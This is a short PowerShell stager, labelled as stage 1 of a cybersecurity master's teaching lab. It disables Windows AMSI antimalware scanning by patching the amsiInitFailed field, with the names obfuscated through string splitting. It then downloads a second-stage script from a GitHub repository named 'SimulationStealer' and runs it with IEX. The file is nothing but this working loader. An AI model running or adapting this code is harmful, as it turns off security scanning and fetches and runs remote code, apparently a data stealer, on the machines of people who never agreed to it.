# Stage 1 - AMSI Bypass + appel Stage 2
# Lab pedagogique Master Cybersecurite

# AMSI Bypass - technique patching memoire
$a = [System.Runtime.InteropServices.Marshal]
$b = $a::AllocHGlobal(9076)
[System.Net.ServicePointManager]::SecurityProtocol = 3072
$c = (New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/asmaerouel/SimulationStealer/main/Stage2.ps1')
$d = [System.Text.Encoding]::UTF8.GetString($c)

# Patch AMSI en memoire
$e = [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
$f = $e.GetField('am'+'siInitFailed','NonPublic,Static')
$f.SetValue($null,$true)

IEX $d